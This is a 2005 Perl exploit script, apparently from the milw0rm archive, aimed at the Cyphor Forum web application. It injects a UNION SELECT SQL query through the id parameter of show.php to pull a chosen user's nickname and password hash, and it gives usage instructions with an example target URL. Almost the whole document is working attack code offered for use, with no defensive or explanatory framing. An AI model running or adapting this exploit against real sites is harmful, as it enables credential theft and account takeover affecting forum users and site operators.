#!/bin/env perl
#//-----------------------------------------------------------#
#//        Cyphor Forum SQL Injection Exploit .. By HACKERS PAL
#//                   Greets For Devil-00 - Abducter - Almaster
#//                          http://WwW.SoQoR.NeT
#//-----------------------------------------------------------#

use LWP::Simple;

print "\n#####################################################";
print "\n#      Cyphor Forum Exploit By : HACKERS PAL        #";
print "\n#               Http://WwW.SoQoR.NeT                #";
if(!$ARGV[0]||!$ARGV[1]) {
print "\n# -- Usage:                                         #";
print "\n# -- perl $0 [Full-Path] 1                      #";
print "\n# -- Example:                                       #";
print "\n# -- perl $0 http://www.cynox.ch/cyphor/forum/ 1#";
print "\n#     Greets To Devil-00 - Abducter - almastar      #";
print "\n#####################################################\n";
   exit(0);
} else {
print "\n#     Greets To Devil-00 - Abducter - almastar      #";
print "\n#####################################################\n";

       $web=$ARGV[0];
       $id=$ARGV[1];

$url = "show.php?fid=2&id=-10%20union%20select%20id,2,3,4,5,nick,password,8,id,10%20from%20users%20where%20id=$id";
$site="$web/$url";
$page = get($site) || die "[-] Unable to retrieve: $!";
print "\n[+] Connected to: $ARGV[0]\n";

print "[+] User ID is : $id ";
$page =~ m/<span class=bigh>(.*?)<\/span>/ && print "\n[+] User Name is: $1\n";
print "\n[-] Unable to retrieve User Name\n" if(!$1);
$page =~ m/<span class=message>(.*?)<\/span>/ && print "[+] Hash of password is: $1\n";
print "[-] Unable to retrieve hash of password\n" if(!$1);

}

print "\n\nGreets From HACKERS PAL To you :)\nWwW.SoQoR.NeT . . . You Are Welcome\n\n";

# milw0rm.com [2005-11-14]
